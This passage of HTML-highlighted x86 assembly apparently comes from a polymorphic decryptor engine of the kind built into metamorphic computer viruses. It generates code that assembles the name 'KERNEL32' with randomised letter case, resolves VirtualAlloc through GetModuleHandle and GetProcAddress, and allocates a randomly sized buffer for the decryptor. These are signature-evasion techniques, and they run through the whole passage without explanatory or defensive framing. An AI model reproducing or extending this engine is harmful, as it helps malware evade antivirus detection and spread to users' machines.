                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@VirtualAllocAlreadyImported</span><span class="sc0"> </span><span class="sc1">; If it does, jump and</span><span class="sc0">
                                                    </span><span class="sc1">; continue</span><span class="sc0">

   </span><span class="sc1">;; Here we are going to create a code that imports VirtualAlloc using the</span><span class="sc0">
   </span><span class="sc1">;; functions GetModuleHandleA/W and GetProcAddress.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleMode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Check if GetModuleHandle</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GetModuleHandleUNICODE</span><span class="sc0">     </span><span class="sc1">; is ASCII or UNICODE</span><span class="sc0">

     </span><span class="sc5">@@GetModuleHandleASCII</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">           </span><span class="sc1">; Set 'KERN' with random</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">              </span><span class="sc1">; up/downcase</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_FirstPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00002020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'23LE'</span><span class="sc0">              </span><span class="sc1">; Set 'EL32' with random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_SecondPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; up/downcase</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0">   </span><span class="sc1">; WEIGHT_X006</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontSetExtension0</span><span class="sc0">        </span><span class="sc1">; Select randomly if we put</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                   </span><span class="sc1">; the extension or not. If</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">           </span><span class="sc1">; we don't, GetModuleHandle</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc0">              </span><span class="sc1">; puts ".DLL" for us</span><span class="sc0">
        </span><span class="sc5">@@DontSetExtension0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_ThirdPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set it at the first part</span><span class="sc0">
                                                    </span><span class="sc1">; of the data buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetFunctionName</span><span class="sc0">     </span><span class="sc1">; Make the "make name" code</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NameOfModuleInitialized</span><span class="sc0">  </span><span class="sc1">; Jump to call GetMod.H.()</span><span class="sc0">

     </span><span class="sc5">@@GetModuleHandleUNICODE</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; UNICODE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00200020h</span><span class="sc0">           </span><span class="sc1">; Set 'KE' (random upcase)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0045004Bh</span><span class="sc0"> </span><span class="sc1">; 'EK'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_FirstPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00200020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004E0052h</span><span class="sc0"> </span><span class="sc1">; 'NR'    ; Set 'RN'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_SecondPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00200020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004C0045h</span><span class="sc0"> </span><span class="sc1">; 'LE'    ; Set 'EL'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_ThirdPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetFunctionName</span><span class="sc0">     </span><span class="sc1">; Make the name</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00320033h</span><span class="sc0"> </span><span class="sc1">; '23'    ; Set '32'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_FirstPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0">     </span><span class="sc1">; WEIGHT_X006</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontSetExtension1</span><span class="sc0">        </span><span class="sc1">; Set (or not) the extension</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                   </span><span class="sc1">; ".DLL"</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00200000h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0044002Eh</span><span class="sc0"> </span><span class="sc1">; 'D.'</span><span class="sc0">
          </span><span class="sc5">@@DontSetExtension1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_SecondPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontSetExtension2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00200020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004C004Ch</span><span class="sc0"> </span><span class="sc1">; 'LL'</span><span class="sc0">
          </span><span class="sc5">@@DontSetExtension2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_ThirdPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetFunctionName</span><span class="sc0">    </span><span class="sc1">; Make that part of the name</span><span class="sc0">

   </span><span class="sc5">@@NameOfModuleInitialized</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0">          </span><span class="sc1">; Make a "Call</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; GetModuleHandle"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHReg</span><span class="sc0">                </span><span class="sc1">; Push the module name</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoCALLMem</span><span class="sc0">                </span><span class="sc1">; Call the function</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; Make an APICALL_STORE [Data+10h]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'triV'</span><span class="sc0">     </span><span class="sc1">; Now make the name of the function to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_FirstPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; get the address,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Alau'</span><span class="sc0">                         </span><span class="sc1">; in this case</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_SecondPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; VirtualAlloc()</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'coll'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_ThirdPartOfFunction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetFunctionName</span><span class="sc0">       </span><span class="sc1">; Set the function name</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Make the PUSH of the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHReg</span><span class="sc0">             </span><span class="sc1">; offset to the name</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0">  </span><span class="sc1">; Make the PUSH of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; module handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegMem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHReg</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoCALLMem</span><span class="sc0">        </span><span class="sc1">; Call to GetProcAddress()</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">        </span><span class="sc1">; Insert an APICALL_STORE [Data]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                                         </span><span class="sc1">; Set the function address. We don't</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; check if it's OK</span><span class="sc0">
                                                       </span><span class="sc1">; because we know it's</span><span class="sc0">
                                                       </span><span class="sc1">; OK.</span><span class="sc0">
   </span><span class="sc5">@@VirtualAllocAlreadyImported</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; Initialize the registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; used by the decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; Push the values for allocating</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">      </span><span class="sc1">; memory: PAGE_READWRITE and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">            </span><span class="sc1">; MEM_COMMIT</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01F000h</span><span class="sc0">          </span><span class="sc1">; Allocate 3407872 bytes plus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">340000h</span><span class="sc0">          </span><span class="sc1">; a random up to 128 Kb.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">      </span><span class="sc1">; Push the value</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">              </span><span class="sc1">; Push 0 (reserve where the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">      </span><span class="sc1">; system wants)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoCALLMem</span><span class="sc0">        </span><span class="sc1">; Call to VirtualAlloc</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">             </span><span class="sc1">; APICALL_STORE [Data]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                                              </span><span class="sc1">; Get three new registers</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; Get the returned value in a</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegMem</span><span class="sc0">      </span><span class="sc1">; register</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MakeCheckWith0</span><span class="sc0">   </span><span class="sc1">; Make a check with NULL to know</span><span class="sc0">
                                              </span><span class="sc1">;  if the function worked</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">              </span><span class="sc1">; JZ -&gt; if VirtualAlloc returned</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;  NULL, jump to ExitProcess</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_Jump_ErrorInVirtualAlloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Save the</span><span class="sc0">
